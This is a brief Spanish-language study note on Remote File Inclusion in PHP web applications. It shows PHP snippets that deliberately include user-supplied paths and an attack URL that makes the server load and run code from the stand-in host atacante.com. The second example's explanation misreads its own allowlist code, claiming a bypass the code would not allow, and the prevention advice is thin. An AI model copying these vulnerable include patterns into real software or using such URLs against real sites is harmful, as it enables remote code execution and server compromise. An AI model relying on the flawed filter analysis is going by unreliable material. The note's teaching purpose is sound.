____

- Tags:

___

# Definición 

La Inclusión Remota de Archivos (**RFI**) es una vulnerabilidad de seguridad que afecta a aplicaciones web. Se produce cuando un programa permite a un atacante incluir archivos remotos a través de la entrada de usuario. Esto puede tener consecuencias graves, ya que el atacante puede ejecutar código arbitrario en el servidor, comprometiendo la integridad y seguridad del sistema.

___
# Cómo funciona

Cuando una aplicación web no valida adecuadamente las entradas de usuario, un atacante puede manipular esas entradas para incluir archivos remotos. Esto significa que el atacante puede cargar y ejecutar código desde un servidor externo, aprovechando la vulnerabilidad.

___
# Ejemplos:
### Ejemplo 1: RFI Básico

Supongamos que tienes una aplicación web que incluye archivos **PHP** para mostrar contenido dinámico:

```php
// Archivo index.php
<?php
    $page = $_GET['page'];
    include($page . '.php');
?>
```

En este caso, si un atacante accede a la URL `http://tusitio.com/index.php?page=http://atacante.com/malicious`, la aplicación incluirá y ejecutará el código del archivo remoto `http://atacante.com/malicious.php`, permitiendo al atacante ejecutar código en el servidor.

### Ejemplo 2: RFI con Filtro Insuficiente

Supongamos que la aplicación web intenta filtrar ciertas extensiones de archivo, pero el filtro es insuficiente:

```php
// Archivo index.php con filtro de extensión
<?php
    $page = $_GET['page'];
    $allowed_extensions = ['php', 'html', 'txt'];
    
    $page_extension = pathinfo($page, PATHINFO_EXTENSION);
    
    if (in_array($page_extension, $allowed_extensions)) {
        include($page);
    } else {
        echo "Extensión no permitida.";
    }
?>
```

Un atacante podría superar este filtro accediendo a la URL `http://tusitio.com/index.php?page=http://atacante.com/malicious` ya que la extensión `malicious` no está prohibida.

___
# Consecuencias

Las consecuencias de un **RFI** pueden ser diversas y peligrosas. El atacante puede ejecutar comandos en el servidor, robar información confidencial, modificar o eliminar datos, e incluso comprometer todo el sistema.

___
# Prevención

Para prevenir estos escenarios, es crucial validar y filtrar de manera exhaustiva todas las entradas de usuario. Además, se deben utilizar rutas relativas en lugar de rutas absolutas al incluir archivos. Asegurarse de que la aplicación solo incluya archivos locales y mantener todas las bibliotecas y aplicaciones actualizadas también es esencial para mitigar los riesgos asociados con la **RFI**.